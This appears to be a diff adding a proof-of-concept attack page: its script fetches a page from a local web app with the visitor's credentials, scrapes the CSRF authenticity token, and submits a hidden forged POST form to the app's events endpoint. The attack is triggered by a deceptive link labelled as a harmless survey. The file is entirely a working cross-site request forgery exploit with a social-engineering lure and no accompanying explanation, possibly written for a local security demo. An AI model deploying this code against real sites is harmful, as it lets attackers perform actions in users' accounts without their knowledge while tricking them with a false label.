@@ -1,0 +1,33 @@
+<html>
+    <script>
+      var req = new XMLHttpRequest();
+      req.open('GET', 'http://localhost:4000/events/new', false); 
+      req.withCredentials = true;
+      req.send(null);
+      if(req.status == 200) {
+        window.token = req.responseText.match(/<input type="hidden" name="authenticity_token" value="(.*)" \/>/)[1];
+      }
+      console.log(window.token);
+
+      function hack() {
+        var f = document.createElement('form');
+        var authenticityTokenEl = document.createElement('input');
+        authenticityTokenEl.setAttribute('type', 'hidden');
+        authenticityTokenEl.setAttribute('name', 'authenticity_token');
+        authenticityTokenEl.setAttribute('value', window.token);
+        f.appendChild(authenticityTokenEl);
+        f.style.display = 'none';
+        document.body.appendChild(f);
+        f.method = 'POST';
+        f.action = 'http://localhost:4000/events';
+        f.submit();
+        return false;
+      }
+
+    </script>
+
+  <body>
+    <a href="#" onclick="hack()">To the harmless survey</a>
+  </body>
+</html>
+
